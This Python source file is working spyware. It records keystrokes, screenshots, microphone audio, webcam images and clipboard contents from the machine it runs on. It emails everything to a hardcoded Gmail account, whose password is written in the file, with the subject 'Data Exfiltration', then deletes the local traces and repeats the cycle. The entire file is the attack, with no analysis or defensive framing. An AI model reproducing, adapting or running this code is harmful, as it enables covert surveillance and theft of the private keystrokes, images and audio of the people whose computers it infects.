import re
import os
import shutil
import time
import logging
import json
import socket
import sounddevice
import cv2
import browserhistory as bh
from subprocess import Popen, TimeoutExpired, check_output, CalledProcessError
from appdirs import system
from scipy.io.wavfile import write as write_rec
from PIL import ImageGrab
from pynput.keyboard import Listener
import win32clipboard
import requests
import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from pathlib import Path
from multiprocessing import Process
from threading import Thread
from queue import Queue, Empty


class RegObject:
    def __init__(self):
        self.re_xml = re.compile(r'.{1,255}\.xml$')
        self.re_txt = re.compile(r'.{1,255}\.txt$')
        self.re_png = re.compile(r'.{1,255}\.png$')
        self.re_jpg = re.compile(r'.{1,255}\.jpg$')
        self.re_audio = re.compile(r'.{1,255}\.wav$')


def smtp_handler(email_address: str, password: str, email: MIMEMultipart):
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as session:
            session.starttls()
            session.login(email_address, password)
            session.sendmail(email_address, email_address, email.as_string())
    except smtplib.SMTPException as mail_err:
        logging.exception(f"Email error: {mail_err}")


def email_attach(path: Path, attach_file: str) -> MIMEBase:
    attach = MIMEBase('application', "octet-stream")
    attach_path = path / attach_file
    with attach_path.open('rb') as attachment:
        attach.set_payload(attachment.read())
    encoders.encode_base64(attach)
    attach.add_header('Content-Disposition', f'attachment; filename={attach_file}')
    return attach


def send_email(path: Path, re_obj: RegObject):
    email_address = 'vjcndisposable@gmail.com'  # Replace with a valid email address
    password = 'leec vspm kslf sbwz'  # Replace with the correct password

    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = 'Data Exfiltration'

    for file in path.iterdir():
        if file.is_file() and any(
                pattern.match(file.name) for pattern in
                [re_obj.re_xml, re_obj.re_txt, re_obj.re_png, re_obj.re_jpg, re_obj.re_audio]
        ):
            msg.attach(email_attach(path, file.name))

    smtp_handler(email_address, password, msg)


def microphone(mic_path: Path):
    frames_per_second = 44100
    seconds = 60

    mic_path.mkdir(parents=True, exist_ok=True)
    rec_name = mic_path / 'mic_recording.wav'
    recording = sounddevice.rec(
        int(seconds * frames_per_second), samplerate=frames_per_second, channels=2
    )
    sounddevice.wait()
    write_rec(str(rec_name), frames_per_second, recording)


def screenshot_and_log(screenshot_path: Path, log_path: Path):
    screenshot_path.mkdir(parents=True, exist_ok=True)
    log_path.parent.mkdir(parents=True, exist_ok=True)
    logging.basicConfig(filename=log_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def log_keys():
        with Listener(on_press=lambda key: logging.info(str(key))) as listener:
            listener.join()

    log_thread = Thread(target=log_keys, daemon=True)
    log_thread.start()

    for current in range(10):
        pic = ImageGrab.grab()
        capture_path = screenshot_path / f'{current}_screenshot.png'
        pic.save(capture_path)
        time.sleep(6)

    log_thread.join()


def webcam_capture(webcam_path: Path):
    webcam_path.mkdir(parents=True, exist_ok=True)
    cam = cv2.VideoCapture(0)
    for current in range(5):
        ret, img = cam.read()
        if ret:
            cv2.imwrite(str(webcam_path / f'{current}_webcam.jpg'), img)
        time.sleep(5)
    cam.release()


def get_clipboard(export_path: Path):
    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
    except (OSError, TypeError):
        pasted_data = ''
    finally:
        win32clipboard.CloseClipboard()

    clip_path = export_path / 'clipboard_info.txt'
    try:
        with clip_path.open('w', encoding='utf-8') as clipboard_info:
            clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')
    except OSError as file_err:
        logging.exception('Error occurred during file operation: %s\n', file_err)


def run():
    base_path = Path('C:/Tmp') if os.name == 'nt' else Path('/tmp/logs')
    base_path.mkdir(parents=True, exist_ok=True)

    tasks = {
        'screenshots_and_logs': (screenshot_and_log, base_path / 'screenshots', base_path / 'key_logs.txt'),
        'mic': (microphone, base_path / 'mic'),
        'webcam': (webcam_capture, base_path / 'webcam'),
        'clipboard': (get_clipboard, base_path),
    }

    regex_obj = RegObject()
    threads = []

    for task_name, task_args in tasks.items():
        print(f"Starting task: {task_name}")
        thread = Thread(target=task_args[0], args=task_args[1:], daemon=True)
        thread.start()
        threads.append(thread)

    start_time = time.time()

    for thread in threads:
        remaining_time = 60 - (time.time() - start_time)
        if remaining_time > 0:
            thread.join(timeout=remaining_time)

    print("Sending emails...")
    for task_name, task_args in tasks.items():
        send_email(task_args[1] if isinstance(task_args[1], Path) else base_path, regex_obj)

    shutil.rmtree(base_path, ignore_errors=True)

    run()


if __name__ == '__main__':
    try:
        run()
    except KeyboardInterrupt:
        print("Program interrupted.")
    except Exception as e:
        logging.exception(f"Unexpected error: {e}")
